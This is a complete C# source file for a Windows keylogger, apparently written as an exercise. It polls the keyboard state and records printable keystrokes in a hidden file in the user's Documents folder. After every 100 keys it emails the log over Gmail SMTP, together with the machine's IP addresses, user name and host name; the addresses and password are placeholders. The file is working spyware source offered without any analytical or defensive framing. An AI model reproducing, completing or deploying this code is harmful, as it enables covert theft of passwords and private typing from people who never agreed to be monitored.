using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace No_4._1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystroke = 0;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            while (true)
            {
                Thread.Sleep(130);

                if(!Directory.Exists(filepath))
                {
                    Directory.CreateDirectory(filepath);
                }

                String path = (filepath + @"\fileforkeylogger.txt");

                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {

                    }
                }

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        Console.Write((char)i + ".");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i + ".");
                        }

                        numberOfKeystroke++;

                        if (numberOfKeystroke % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\fileforkeylogger.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach(var address in host.AddressList)
            {
                emailBody += "Address: " + address;

                emailBody += "\nUser: " + Environment.UserDomainName + " \\" + Environment.UserName;
                emailBody += "\nhost " + host;
                emailBody += "\ntime: " + now.ToString() + "\n";
                emailBody += logContents;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                MailMessage mailMessage = new MailMessage();

                mailMessage.From = new MailAddress("/*mail*/");
                mailMessage.To.Add("/*mail*/");
                mailMessage.Subject = subject;
                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("/*mail*/", "/*password*/");
                mailMessage.Body = emailBody;
                client.Send(mailMessage);
            }
        }
    }
}
